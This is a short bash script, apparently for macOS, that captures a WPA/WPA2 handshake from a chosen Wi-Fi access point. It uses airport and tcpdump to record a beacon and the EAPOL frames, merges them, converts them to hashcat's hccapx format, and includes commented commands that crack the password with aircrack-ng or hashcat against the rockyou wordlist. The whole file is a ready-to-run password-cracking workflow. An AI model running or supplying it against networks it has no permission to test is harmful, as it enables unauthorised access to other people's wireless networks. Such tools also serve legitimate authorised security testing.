#!/bin/bash

# scan nearby access points
airport -s

# get bssid
read -p 'Which mac address: ' bssid

# get channel
read -p 'Which channel: ' channel

# disassociate from the AP
sudo airport -z

# set an arbitrary channel, notice the lack of space between the flag and the value
sudo airport -c$channel

# capture beacon (should be quick)
sudo tcpdump "type mgt subtype beacon and ether src $bssid" -I -c 1 -i en0 -w beacon.cap

# wait for handshake
sudo tcpdump "ether proto 0x888e and ether host $bssid" -I -c 4 -U -vvv -i en0 -w eapol.cap

# merge beacon and handshake
mergecap -a -F pcap -w handshake.cap beacon.cap eapol.cap

# create hashcat compat file
~/hashcat-utils/src/cap2hccapx.bin handshake.cap handshake.hccapx 

# use aircrack (slow)
#aircrack-ng -w rockyou.txt handshake.cap

# use hashcat (fast)
# hashcat -m 2500 handshake.hccapx rockyou.txt

